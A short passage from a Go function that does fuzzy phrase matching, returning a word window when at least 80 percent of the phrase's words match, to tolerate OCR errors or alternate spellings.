			// 80% threshold to account for OCR errors or alternate spellings
			threshold := (phraseLen * 8) / 10
			if matches >= threshold {
				return strings.Join(window, " ")
			}
		}
	}
	return ""
}
